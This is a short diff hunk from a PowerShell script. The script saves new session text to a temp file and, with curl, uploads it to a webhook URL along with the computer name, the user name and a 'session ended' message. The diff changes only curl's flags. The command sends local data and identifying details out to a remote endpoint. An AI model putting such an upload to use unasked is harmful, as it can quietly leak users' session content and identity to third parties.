@@ -10,5 +10,5 @@ if (-not $a -or $a.Length -le $pos) { exit }
 
 $f = "$env:TEMP\s_$(Get-Date -f yyyyMMdd_HHmmss).txt"
 $a.Substring($pos) | Set-Content $f -Encoding UTF8
-curl.exe -s -F "content=**$env:COMPUTERNAME** / $env:USERNAME — sessao terminada" -F "files[0]=@$f" $hook
+curl.exe -s -f --form-string "content=**$env:COMPUTERNAME** / $env:USERNAME — sessao terminada" -F "files[0]=@$f" $hook
 Set-Content $posF $a.Length
